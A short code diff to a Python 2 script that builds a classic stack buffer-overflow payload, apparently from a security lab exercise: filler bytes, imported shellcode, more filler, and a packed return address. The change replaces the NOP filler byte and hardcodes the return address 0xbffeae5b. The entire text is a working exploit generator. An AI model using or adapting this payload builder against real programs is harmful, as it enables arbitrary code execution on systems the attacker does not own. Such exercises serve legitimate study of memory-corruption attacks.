@@ -1,4 +1,3 @@
 from shellcode import shellcode
 from struct import pack
-
-print "\x90"*(1024 - len(shellcode)) + shellcode + "\x90"*12 + pack("<I", address)
+print "\x99"*(1024 - len(shellcode)) + shellcode + "\x99"*12 + pack("<I", 0xbffeae5b)
